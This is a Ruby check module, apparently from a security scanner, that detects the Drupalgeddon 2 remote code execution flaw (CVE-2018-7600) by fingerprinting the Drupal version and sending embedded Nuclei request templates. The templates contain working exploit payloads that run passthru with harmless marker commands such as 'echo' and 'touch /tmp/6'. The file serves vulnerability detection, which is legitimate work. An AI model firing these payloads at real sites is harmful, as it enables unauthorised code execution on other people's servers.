module Intrigue
  module Issue
    class DrupalCVE20187600 < BaseIssue
      def self.generate(instance_details = {})
        {
          added: '2021-03-30',
          name: 'drupal_cve_2018_7600',
          pretty_name: 'Drupal Unauthenticated Remote Code Execution (Drupalgeddon 2) (CVE-2018-7600)',
          severity: 1,
          category: 'vulnerability',
          status: 'confirmed',
          description: 'Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.',
          identifiers: [
            { type: 'CVE', name: 'CVE-2018-7600' }
          ],
          affected_software: [
            { vendor: 'Drupal', product: 'Drupal' }
          ],
          references: [
            { type: 'description', uri: 'https://nvd.nist.gov/vuln/detail/CVE-2018-7600' },
            { type: 'description', uri: 'https://drupal.org/sa-core-2018-002'},
          ],
          authors: ['jl-dos', 'rootxharsh', 'iamnoooob', 'S1r1u5_', 'cookiehanhoan', 'madrobot', 'maxim']
        }.merge!(instance_details)
      end
    end
  end

  module Task
    class DrupalCVE20187600 < BaseCheck
      def self.check_metadata
        {
          allowed_types: ['Uri']
        }
      end

      def detect_drupal_version(uri)
        drupal_7_paths = ['CHANGELOG.txt', 'includes/bootstrap.inc', 'includes/database.inc']
        drupal_8_paths = ['core/CHANGELOG.txt', 'core/includes/bootstrap.inc', 'core/includes/database.inc']

        responses = drupal_7_paths.map { |p| http_request(:get, "#{uri}/#{p}").code }
        return 7 unless (responses & ['200', '403']).empty?

        responses = drupal_8_paths.map { |p| http_request(:get, "#{uri}/#{p}").code }
        return 8 unless (responses & ['200', '403']).empty?

        _log_error 'Drupal Version does not appear to be supported; aborting.'
      end

      # return truthy value to create an issue
      def check
        # run a nuclei
        uri = _get_entity_name
        version = detect_drupal_version(uri)
        return if version.nil?

        drupal_7_template = <<-HEREDOC
        id: CVE-2018-7600

        info:
          name: Drupal Drupalgeddon 2 RCE (Drupal 7)
          author: maxim
          severity: critical
          reference: https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600
          tags: cve,cve2018,drupal,rce
        
        requests:
          - raw:
              - |
                POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo+-1ntr16u31337 HTTP/1.1
                Host:  {{Hostname}}
                User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
                Referer:  {{Hostname}}/user/register
                Content-Type: application/x-www-form-urlencoded
                Connection: close
        
                form_id=user_pass&_triggering_element_name=name
        
              - |
                POST /?q=file/ajax/name/%23value/{{form_build_id}} HTTP/1.1
                Host:  {{Hostname}}
                User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
                Referer:  {{Hostname}}/user/register
                Content-Type: application/x-www-form-urlencoded
                Connection: close
        
                form_build_id={{form_build_id}}
        
            matchers-condition: and
            matchers:
              - type: status
                status:
                  - 200
                  
              - type: word
                words:
                  - '1ntr16u31337'
                part: body
            extractors:
              - type: regex
                name: form_build_id
                part: body
                group: 1
                internal: true
                regex:
                  - '<input type="hidden" name="form_build_id" value="(form\-[\w|\-]+)"'
        HEREDOC

        drupal_8_template = <<-HEREDOC
        id: CVE-2018-7600

        info:
          name: Drupal Drupalgeddon 2 RCE (Drupal 8)
          author: pikpikcu, maxim
          severity: critical
          reference: https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600
          tags: cve,cve2018,drupal,rce
        
        requests:
          - raw:
              - |
                POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
                Host:  {{Hostname}}
                User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
                Accept: application/json
                Referer:  {{Hostname}}/user/register
                X-Requested-With: XMLHttpRequest
                Content-Type: multipart/form-data; boundary=---------------------------99533888113153068481322586663
                Connection: close
        
                -----------------------------99533888113153068481322586663
                Content-Disposition: form-data; name="mail[#post_render][]"
        
                passthru
                -----------------------------99533888113153068481322586663
                Content-Disposition: form-data; name="mail[#type]"
        
                markup
                -----------------------------99533888113153068481322586663
                Content-Disposition: form-data; name="mail[#markup]"
        
                echo 1ntr16u31337
                -----------------------------99533888113153068481322586663
                Content-Disposition: form-data; name="form_id"
        
                user_register_form
                -----------------------------99533888113153068481322586663
                Content-Disposition: form-data; name="_drupal_ajax"
        
              - |
                POST /user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
                Host:  {{Hostname}}
                User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
                Referer:  {{Hostname}}/user/register
                Content-Type: application/x-www-form-urlencoded
                Connection: close
        
                form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=passthru&timezone[a][#lazy_builder][][]=touch+/tmp/6
        
            matchers-condition: and
            matchers:
              - type: word
                words:
                  - "1ntr16u31337"
                  - "The website encountered an unexpected error. Please try again later"
                part: body
                condition: or
        
              - type: status
                status:
                  - 200
                  - 500
                condition: or
        
        HEREDOC

        _log "Target appears to be running Drupal Version #{version}!"
        template = version == 8 ? drupal_8_template : drupal_7_template
        run_nuclei_template_from_string(uri, template)

      end
    end
  end
end
